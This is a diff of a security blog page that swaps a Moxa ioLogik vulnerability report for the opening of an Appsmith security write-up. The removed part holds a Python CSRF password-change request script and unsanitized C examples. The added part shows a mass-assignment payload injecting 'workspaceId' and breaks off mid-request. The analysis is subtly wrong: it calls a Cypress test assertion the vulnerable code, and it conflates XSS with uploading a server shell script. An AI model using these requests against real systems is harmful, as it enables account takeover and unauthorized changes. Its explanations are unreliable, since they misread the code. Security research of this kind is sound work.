@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1#article","headline":"Appsmith in The Wild (part 1) — HADESS Magazine","description":"Appsmith is a popular low-code development platform that allows users to build and deploy custom applications. As with any software system, security risks are...","url":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1"},"datePublished":"June 15, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/06/appsmith_cover.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1#article","headline":"Appsmith in The Wild (part 1) — HADESS Magazine","description":"Appsmith is a popular low-code development platform that allows users to build and deploy custom applications. As with any software system, security risks are...","url":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/appsmith-in-the-wild-part-1"},"datePublished":"June 15, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/06/appsmith_cover.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,607 +1550,1208 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/06/appsmith_cover.png">
       
-<p class="wp-block-paragraph">During our thorough assessment of the Moxa ioLogik E1212 series, we uncovered critical vulnerabilities that pose significant risks to the security of the system. These vulnerabilities encompass various attack vectors, including Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), cryptographic failures, and broken access control mechanisms. Each of these vulnerabilities presents unique challenges and potential exploits that could compromise the integrity and confidentiality of the system. In this report, we detail our findings, assess the implications of these vulnerabilities, and provide actionable recommendations to mitigate these risks effectively.</p>
+<h2 class="wp-block-heading" id="h-what-is-appsmith-in-cyber-security"><strong>What Is Appsmith In Cyber Security?</strong></h2>
 
 
 
-<p class="wp-block-paragraph"><a href="https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability">https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability</a></p>
+<p class="wp-block-paragraph">Appsmith is a popular low-code development platform that allows users to build and deploy custom applications. As with any software system, security risks are a significant concern that must be addressed to ensure the confidentiality, integrity, and availability of data and resources.</p>
 
 
 
-<p class="wp-block-paragraph"><a href="https://github.com/HadessCS/CVE-2023-5961">https://github.com/HadessCS/CVE-2023-5961</a></p>
+<p class="wp-block-paragraph">This abstract presents a deep analysis of the security risks associated with Appsmith and provides insights into potential vulnerabilities and mitigation strategies.</p>
 
 
 
-<h2 class="wp-block-heading">Abstract</h2>
+<p class="wp-block-paragraph">The analysis begins by examining the authentication and authorization mechanisms employed by Appsmith. Various risks, such as weak authentication methods, inadequate password policies, and insufficient access controls, are identified. Mitigation measures, including multi-factor authentication, strong password requirements, and granular access controls, are suggested to enhance security.</p>
 
 
 
-<p class="wp-block-paragraph">Moxa Inc., a pioneering company founded in 1987 and headquartered in Taipei, Taiwan, stands at the forefront of industrial networking, computing, and automation solutions. With a steadfast commitment to reliability and innovation, Moxa has garnered trust as a leading provider of tailored solutions across diverse industries, including transportation, energy, and marine sectors.</p>
+<h2 class="wp-block-heading" id="h-introduction"><strong>Introduction</strong></h2>
 
 
 
-<p class="wp-block-paragraph">Within its comprehensive product portfolio, Moxa offers a spectrum of industrial-grade solutions meticulously crafted for rugged environments. Industrial Ethernet Solutions form the cornerstone, comprising switches, gateways, routers, and network management software, engineered to withstand harsh conditions while ensuring seamless connectivity. Complementing this, the Industrial Computing range boasts robust computers, panel displays, and displays capable of enduring extreme temperatures and environmental challenges.</p>
+<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="924" height="284" src="/wp-content/uploads/2023/06/appsmith_logo_white.png" alt="appsmith logo" class="wp-image-7154" srcset="/wp-content/uploads/2023/06/appsmith_logo_white.png 924w, /wp-content/uploads/2023/06/appsmith_logo_white-300x92.png 300w, /wp-content/uploads/2023/06/appsmith_logo_white-768x236.png 768w" sizes="(max-width: 924px) 100vw, 924px" /></figure>
 
 
 
-<p class="wp-block-paragraph">Serial Connectivity solutions bridge the gap between legacy systems and modern networks, featuring device servers, converters, and USB connectivity solutions. Moxa&#8217;s Wireless Solutions further enhance connectivity with industrial-grade wireless AP/bridge/client products, guaranteeing uninterrupted communication in challenging environments. Meanwhile, Edge Connectivity solutions facilitate efficient data acquisition and device connectivity through remote I/O, I/O to serial, and I/O to Ethernet solutions.</p>
+<p class="wp-block-paragraph">To thoroughly understand and address the security risks associated with Appsmith, a detailed technical analysis is required. This analysis aims to uncover potential vulnerabilities that attackers may exploit to compromise the confidentiality, integrity, and availability of the system.</p>
 
 
 
-<p class="wp-block-paragraph">Moxa&#8217;s diverse range of solutions caters to an array of industries, each with unique requirements. In the transportation sector, Moxa&#8217;s solutions ensure safe and efficient operations across railways, roadways, and marine applications. In the energy sector, Moxa supports power generation, transmission, distribution, and renewable energy sources with its robust solutions. For process automation industries like oil &amp; gas, mining, and chemicals, Moxa delivers tailored solutions to streamline operations. In factory automation, Moxa&#8217;s solutions optimize manufacturing processes and machine automation, enhancing productivity. Finally, in the marine industry, Moxa ensures reliable ship-to-shore and ship-to-ship communications, bolstering maritime operations. Through its unwavering dedication to innovation and reliability, Moxa continues to empower industries worldwide with resilient, future-ready solutions.</p>
+<p class="wp-block-paragraph">By conducting a comprehensive assessment, developers and organizations can proactively identify and rectify these vulnerabilities, bolstering the overall security posture of Appsmith-based applications.</p>
 
 
 
-<h2 class="wp-block-heading">Configuration Resets</h2>
+<p class="wp-block-paragraph">One prominent vulnerability that will be explored in this analysis is mass assignment. Mass assignment occurs when user input is directly used to populate object properties, potentially leading to unauthorized modifications. By carefully crafting specific requests, attackers can manipulate object attributes, gain unauthorized privileges, or modify sensitive data.</p>
 
 
 
-<p class="wp-block-paragraph">Cross-Site Request Forgery (CSRF) represents a clandestine assault method deployed by adversaries to dupe unwitting users into executing operations on web applications while authenticated, devoid of their awareness or consent. A pivotal defense mechanism against such nefarious exploits is the CSRF token, engineered specifically to thwart these insidious maneuvers. However, the absence or improper implementation of CSRF tokens within web applications can expose them to egregious security vulnerabilities, potentially resulting in unauthorized alterations to passwords and subsequent account takeovers.</p>
+<p class="wp-block-paragraph">Understanding the intricacies of mass assignment within Appsmith is crucial for implementing effective security controls and preventing potential breaches.</p>
 
 
 
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application endowed with the functionality to enable users to modify their passwords. If this pivotal operation lacks the requisite CSRF token for validation, it creates an exploitable vulnerability ripe for exploitation by malicious actors. Here, an assailant could meticulously fashion a malevolent request, meticulously tailored to trigger the password alteration process clandestinely when unwittingly executed by an authenticated user. Devoid of the protective shield conferred by a CSRF token, this surreptitious manipulation unfurls the perilous prospect of surreptitious password modifications transpiring beyond the user&#8217;s purview, engendering a scenario rife with grave security ramifications.</p>
+<p class="wp-block-paragraph">Another vulnerability that will be investigated is cross-site scripting (XSS). XSS vulnerabilities arise when user-supplied data is incorrectly displayed on web pages without proper sanitization or validation. Exploiting XSS flaws enables attackers to inject malicious scripts into the application, compromising user sessions, stealing sensitive information, or even launching further attacks.</p>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;string.h>
+<p class="wp-block-paragraph">By analyzing Appsmith&#8217;s handling of user input and the effectiveness of output encoding, the risks of XSS can be identified and appropriate countermeasures can be implemented.</p>
 
-// Function to modify user's password
-void modifyPassword(char *newPassword) {
-    // Simulate password modification process
-    printf("Password successfully changed to: %s\n", newPassword);
-}
 
-// Function to handle password change request
-void changePassword(char *newPassword) {
-    // In a real web application, this function would check for CSRF token
-    // and validate the request before allowing password modification.
-    modifyPassword(newPassword);
-}
 
-// Main function
-int main() {
-    char newPassword&#91;50];
+<p class="wp-block-paragraph">Furthermore, the analysis will delve into the potential for cross-site request forgery (CSRF) attacks that can lead to remote code execution (RCE). CSRF vulnerabilities occur when an application does not adequately verify the origin of requests, allowing attackers to trick users into performing unintended actions.</p>
 
-    // Simulate receiving password change request from user
-    printf("Enter new password: ");
-    scanf("%s", newPassword);
 
-    // In a real web application, this function call would include CSRF token validation
-    changePassword(newPassword);
 
-    return 0;
-}
+<p class="wp-block-paragraph">If an attacker successfully leverages CSRF, they may execute arbitrary code on the targeted system, potentially leading to a complete compromise. Investigating the protection mechanisms in place within Appsmith and evaluating their effectiveness is essential to prevent CSRF attacks and mitigate the risk of RCE.</p>
 
 
-</code></pre>
 
+<p class="wp-block-paragraph">Additionally, the analysis will examine the risk of content injection. Content injection occurs when untrusted data is incorporated into dynamically generated content without proper validation or sanitization. Attackers can exploit content injection vulnerabilities to manipulate the application&#8217;s output, inject malicious code, or deceive users.</p>
 
 
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
 
+<p class="wp-block-paragraph">By thoroughly scrutinizing Appsmith&#8217;s handling of user-generated content and assessing the implementation of input validation and output encoding, potential weaknesses can be uncovered and appropriate security measures can be implemented.</p>
 
 
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="909" height="513" src="/wp-content/uploads/2024/01/image.png" alt="" class="wp-image-8309" srcset="/wp-content/uploads/2024/01/image.png 909w, /wp-content/uploads/2024/01/image-300x169.png 300w, /wp-content/uploads/2024/01/image-768x433.png 768w" sizes="(max-width: 909px) 100vw, 909px" /></figure>
 
+<p class="wp-block-paragraph">Lastly, the analysis will focus on the vulnerability arising from broken user authentication via two identical email addresses. In some cases, an application may allow multiple user accounts to have the same email address, resulting in compromised authentication mechanisms.</p>
 
 
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
 
+<p class="wp-block-paragraph">Attackers can exploit this vulnerability to gain unauthorized access to user accounts, potentially compromising sensitive information or impersonating legitimate users. By investigating Appsmith&#8217;s user authentication processes and enforcing strict uniqueness constraints on email addresses, organizations can mitigate this risk and bolster the overall security of the platform.</p>
 
 
-<figure class="wp-block-image size-full"><img decoding="async" width="884" height="516" src="/wp-content/uploads/2024/01/image-1.png" alt="" class="wp-image-8310" srcset="/wp-content/uploads/2024/01/image-1.png 884w, /wp-content/uploads/2024/01/image-1-300x175.png 300w, /wp-content/uploads/2024/01/image-1-768x448.png 768w" sizes="(max-width: 884px) 100vw, 884px" /></figure>
 
+<p class="wp-block-paragraph">In conclusion, this comprehensive technical analysis aims to identify and address significant security vulnerabilities in Appsmith. By exploring vulnerabilities such as mass assignment, XSS, CSRF to RCE, content injection, and broken user authentication via identical email addresses, developers and organizations can take proactive measures to secure the platform and protect the data and privacy of users.</p>
 
 
-<figure class="wp-block-image size-full"><img decoding="async" width="867" height="494" src="/wp-content/uploads/2024/01/image-2.png" alt="" class="wp-image-8311" srcset="/wp-content/uploads/2024/01/image-2.png 867w, /wp-content/uploads/2024/01/image-2-300x171.png 300w, /wp-content/uploads/2024/01/image-2-768x438.png 768w" sizes="(max-width: 867px) 100vw, 867px" /></figure>
 
+<p class="wp-block-paragraph">Through rigorous assessment and diligent implementation of security controls, Appsmith can be fortified against potential threats, ensuring the safe and reliable operation of applications built on this platform.</p>
 
 
-<p class="wp-block-paragraph">In this Python code snippet, the attacker crafts a POST request to the vulnerable web application&#8217;s password change functionality (password_change_url) without including a CSRF token in the request payload. The malicious_request_data dictionary contains the new password to be set.</p>
 
+<h2 class="wp-block-heading" id="h-technical-analysis"><strong>Technical Analysis</strong></h2>
 
 
-<p class="wp-block-paragraph">The requests library is then used to send the malicious request to the web application. If the request is successful (status code 200), the attacker receives confirmation that the password was changed without the presence of a CSRF token. Otherwise, an error message indicating the failure to change the password without a CSRF token is displayed.</p>
 
+<h3 class="wp-block-heading"><strong>Mass Assignment</strong></h3>
 
 
-<pre class="wp-block-code"><code>import requests
 
-# URL of the vulnerable web application's password change functionality
-password_change_url = "http://example.com/change_password"
+<p class="wp-block-paragraph">Mass assignment vulnerability is a security issue that arises when an application assigns or updates multiple properties of an object based on user-supplied input, without proper validation and authorization checks. This vulnerability occurs when an attacker can manipulate the input to modify unintended properties or gain unauthorized access to sensitive data.</p>
 
-# Malicious request payload to change the password without CSRF token
-malicious_request_data = {
-    "new_password": "new_password123"  # New password to be set
-}
 
-# Send the malicious request to change the password without CSRF token
-response = requests.post(password_change_url, data=malicious_request_data)
 
-# Check if the request was successful
-if response.status_code == 200:
-    print("Password successfully changed without CSRF token!")
-else:
-    print("Failed to change password without CSRF token.")
-</code></pre>
+<p class="wp-block-paragraph">In a typical mass assignment scenario, an application receives input, such as form data or API requests, and maps the input values directly to corresponding object properties. If the application does not validate or sanitize the input properly, an attacker can exploit this behavior by submitting additional parameters or modifying existing ones. Consequently, the attacker can manipulate the target object&#8217;s properties beyond what the application intended, potentially compromising the system&#8217;s integrity and security.</p>
 
 
 
-<h2 class="wp-block-heading">Account Takeovers</h2>
+<p class="wp-block-paragraph">For example, consider a user profile update functionality where the application receives a request containing user information such as name, email, and role. If the application blindly updates all properties received in the request without proper authorization checks, an attacker could submit an additional &#8220;isAdmin&#8221; parameter and set it to true, thereby elevating their privileges.</p>
 
 
 
-<p class="wp-block-paragraph">Cross-Site Scripting (XSS) represents a pernicious security vulnerability wherein assailants embed malevolent scripts into web pages accessed by unsuspecting users. These scripts, upon execution within the victim&#8217;s browser environment, engender a spectrum of malicious consequences. Among the most dire ramifications of XSS exploitation is the illicit acquisition of session cookies, a perilous eventuality that can culminate in account takeovers.</p>
+<p class="wp-block-paragraph">The given request is a PUT request to the <code>/api/v1/applications/6457cb929f194a66036e1bc6</code> endpoint. It is using the HTTP/1.1 protocol and specifying the host as <code>appsmith.dev</code>.</p>
 
 
 
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application characterized by inadequate user input sanitization measures, thus affording attackers the opportunity to inject nefarious scripts. When a subsequent user navigates to the compromised page, the embedded script executes surreptitiously, facilitating the transmission of their session cookie to the attacker&#8217;s server.</p>
+<p class="wp-block-paragraph">The request payload (body) is in JSON format:</p>
 
 
 
-<p class="wp-block-paragraph">The peril inherent in this scenario arises from several critical factors, chief among them being the potential theft of session cookies. These tokens serve as indispensable tools wielded by web applications to authenticate and identify users. Through the surreptitious exfiltration of a user&#8217;s session cookie via an XSS attack, malefactors can effectively impersonate the user within the application&#8217;s ecosystem.</p>
+<pre class="wp-block-code"><code>{"color":"#D6D1F2"}</code></pre>
 
 
 
-<p class="wp-block-paragraph">Once armed with the pilfered session cookie, the attacker enjoys unfettered access to the victim&#8217;s account, circumventing conventional login mechanisms and securing full control over the compromised account. This unfettered access empowers the assailant to peruse sensitive data, effect unauthorized alterations, or even lock the legitimate user out of their own account, thereby perpetrating an egregious breach of trust and security.</p>
+<p class="wp-block-paragraph">This payload contains a single property <code>color</code> with a value of <code>#D6D1F2</code>. It seems that the purpose of this request is to update the color property of an application identified by the ID <code>6457cb929f194a66036e1bc6</code>.</p>
 
 
 
-<p class="wp-block-paragraph">Moreover, the ramifications extend beyond the immediate victim, as the compromised account becomes a vector for the dissemination of the XSS attack to other users. This cascading effect precipitates a chain reaction of account takeovers, exacerbating the severity and scope of the security breach.</p>
+<p class="wp-block-paragraph">The response to the PUT request includes the following parameters:</p>
 
 
 
-<p class="wp-block-paragraph">The consequences of a successful XSS exploit are dire and multifaceted. Apart from the tangible risks of data breaches and misuse of compromised accounts for malicious activities such as spam dissemination or financial fraud, the intangible erosion of user trust poses a formidable challenge. In the wake of such security vulnerabilities being exploited, users inevitably lose confidence in the platform&#8217;s ability to safeguard their sensitive information, precipitating a crisis of trust with far-reaching implications for the platform&#8217;s reputation and viability.</p>
+<ol class="wp-block-list">
+<li><code>responseMeta</code>: An object containing metadata about the response.
+<ul class="wp-block-list">
+<li><code>status</code>: The HTTP status code of the response (200 indicates success).</li>
 
 
 
-<p class="wp-block-paragraph">To effectuate an XSS exploit, attackers meticulously orchestrate a series of exploitation steps, beginning with the identification of a vulnerable endpoint within a web application that facilitates file uploads. Subsequent to pinpointing this vulnerability, attackers craft a malicious file housing the requisite code or shell script designed to execute on the server upon successful injection, thereby catalyzing the exploitation process.</p>
+<li><code>success</code>: Indicates whether the request was successful (true in this case).</li>
+</ul>
+</li>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
+<li><code>data</code>: An object containing the updated application data.
+<ul class="wp-block-list">
+<li><code>id</code>: The ID of the application (<code>6457cb929f194a66036e1bc6</code>).</li>
 
-int main() {
-    printf("Content-Type: text/html\n\n");
-    printf("&lt;html>&lt;head>&lt;title>Vulnerable Web App&lt;/title>&lt;/head>&lt;body>\n");
 
-    // Retrieve user input from query string
-    char *query_string = getenv("QUERY_STRING");
 
-    if (query_string != NULL) {
-        // Split query string into key-value pairs
-        char *token = strtok(query_string, "&amp;");
-        while (token != NULL) {
-            // Split each key-value pair into key and value
-            char *key = strtok(token, "=");
-            char *value = strtok(NULL, "=");
+<li><code>modifiedBy</code>: The email address of the user who modified the application (<code>user@example.com</code>).</li>
 
-            if (key != NULL &amp;&amp; value != NULL) {
-                // Display key and value without proper sanitization
-                printf("&lt;b>%s&lt;/b>: %s&lt;br>\n", key, value);
-            }
 
-            token = strtok(NULL, "&amp;");
-        }
+
+<li><code>userPermissions</code>: An array of user permissions associated with the application.</li>
+
+
+
+<li><code>name</code>: The name of the application (<code>My first application</code>).</li>
+
+
+
+<li><code>workspaceId</code>: The ID of the workspace the application belongs to (<code>6457cb919f194a66036e1bc2</code>).</li>
+
+
+
+<li><code>isPublic</code>: Indicates whether the application is public (<code>false</code>).</li>
+
+
+
+<li><code>pages</code>: An array of pages associated with the application.</li>
+
+
+
+<li><code>appIsExample</code>: Indicates whether the application is an example (<code>false</code>).</li>
+
+
+
+<li><code>unreadCommentThreads</code>: The number of unread comment threads in the application.</li>
+
+
+
+<li><code>color</code>: The updated color of the application (<code>#D6D1F2</code>).</li>
+
+
+
+<li><code>slug</code>: The slug or URL-friendly name of the application.</li>
+
+
+
+<li><code>unpublishedCustomJSLibs</code>: An array of unpublished custom JavaScript libraries.</li>
+
+
+
+<li><code>publishedCustomJSLibs</code>: An array of published custom JavaScript libraries.</li>
+
+
+
+<li><code>evaluationVersion</code>: The evaluation version of the application.</li>
+
+
+
+<li><code>applicationVersion</code>: The updated version of the application.</li>
+
+
+
+<li><code>collapseInvisibleWidgets</code>: Indicates whether invisible widgets should be collapsed (<code>true</code>).</li>
+
+
+
+<li><code>isManualUpdate</code>: Indicates whether the update was done manually (<code>true</code>).</li>
+
+
+
+<li><code>new</code>: Indicates whether the application is new (<code>false</code>).</li>
+
+
+
+<li><code>modifiedAt</code>: The timestamp of when the application was last modified.</li>
+</ul>
+</li>
+
+
+
+<li><code>errorDisplay</code>: An empty string indicating no error display message.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">it appears that the <code>workspaceId</code> property is indeed included in the response data. If an attacker can insert a modified <code>workspaceId</code> value in the request payload, it could potentially trigger a mass assignment vulnerability and lead to unauthorized modification of the application&#8217;s workspace association.</p>
+
+
+
+<p class="wp-block-paragraph">For example, if an attacker modifies the request payload as follows:</p>
+
+
+
+<pre class="wp-block-code"><code>{
+  "color": "#D6D1F2",
+  "workspaceId": "attacker-controlled-value"
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">The vulnerable code segment is as follows:</p>
+
+
+
+<pre class="wp-block-code"><code>const application = response.body.data; 
+expect(application.applicationVersion).to.equal(1); 
+cy.NavigateToHome(); 
+cy.reload(); 
+cy.SearchApp(applicationName);</code></pre>
+
+
+
+<p class="wp-block-paragraph">Identifying User Input In the given code, the &#8220;response.body.data&#8221; object is retrieved, which likely contains user-provided data related to the application.</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="643" height="599" src="/wp-content/uploads/2023/06/r1.png" alt="architeture of codes" class="wp-image-7157" srcset="/wp-content/uploads/2023/06/r1.png 643w, /wp-content/uploads/2023/06/r1-300x279.png 300w" sizes="(max-width: 643px) 100vw, 643px" /></figure>
+
+
+
+<p class="wp-block-paragraph">The code <code>const application = response.body.data;</code> will assign both the &#8220;color&#8221; and &#8220;workspaceId&#8221; properties to the <code>application</code> object, even though the intention may have been to only update the &#8220;color&#8221; property. This unauthorized modification of the &#8220;workspaceId&#8221; property demonstrates the mass assignment vulnerability.</p>
+
+
+
+<p class="wp-block-paragraph">Lack of Input Validation and Sanitization The code segment lacks proper input validation and sanitization for the &#8220;application&#8221; object retrieved from the response. It assumes that the retrieved data is valid and trustworthy.</p>
+
+
+
+<p class="wp-block-paragraph">Direct Assignment The vulnerable code directly assigns the retrieved &#8220;application&#8221; object to the &#8220;application&#8221; variable, without validating or sanitizing the data. This allows any potential user input present in the object to be directly assigned and potentially manipulated.</p>
+
+
+
+<p class="wp-block-paragraph">Mass Assignment Vulnerability The mass assignment vulnerability arises when the attacker crafts a malicious request, manipulating the workspaceID or other properties within the &#8220;application&#8221; object. Since the code does not perform any validation or sanitization, the attacker&#8217;s modifications are accepted and assigned to the &#8220;application&#8221; variable.</p>
+
+
+
+<p class="wp-block-paragraph">Potential Impact By successfully manipulating the workspaceID or other properties, the attacker can perform unauthorized actions within the application. This may include modifying the workspaceID, modifying application components, manipulating data, or accessing sensitive information.</p>
+
+
+
+<p class="wp-block-paragraph">Exploitation Scenario In an exploitation scenario, the attacker crafts a request to the /api/v1/applications/64805b4a0ed24064ee24c6ff endpoint and modifies the workspaceID parameter within the payload. The vulnerable code then accepts the modified workspaceID, allowing the attacker to perform unauthorized actions associated with the targeted workspace.</p>
+
+
+
+<h3 class="wp-block-heading"><strong>XSS</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The request you provided is a PUT request made to the following endpoint:</p>
+
+
+
+<p class="wp-block-paragraph">Endpoint: <code>/api/v1/layouts/648054730ed24064ee24c6e6/pages/648054730ed24064ee24c6e8?applicationId=648054730ed24064ee24c6e5</code></p>
+
+
+
+<p class="wp-block-paragraph">It contains a JSON payload representing a DSL (Domain-Specific Language) that describes the layout of a page. The DSL includes various properties and configurations for different widgets within the layout.</p>
+
+
+
+<p class="wp-block-paragraph">Here is a breakdown of the request payload:</p>
+
+
+
+<pre class="wp-block-code"><code>{
+  "dsl": {
+    "widgetName": "MainContainer",
+    "backgroundColor": "none",
+    "rightColumn": 4896,
+    "snapColumns": 64,
+    "detachFromLayout": true,
+    "widgetId": "0",
+    "topRow": 0,
+    "bottomRow": 660,
+    "containerStyle": "none",
+    "snapRows": 124,
+    "parentRowSpace": 1,
+    "type": "CANVAS_WIDGET",
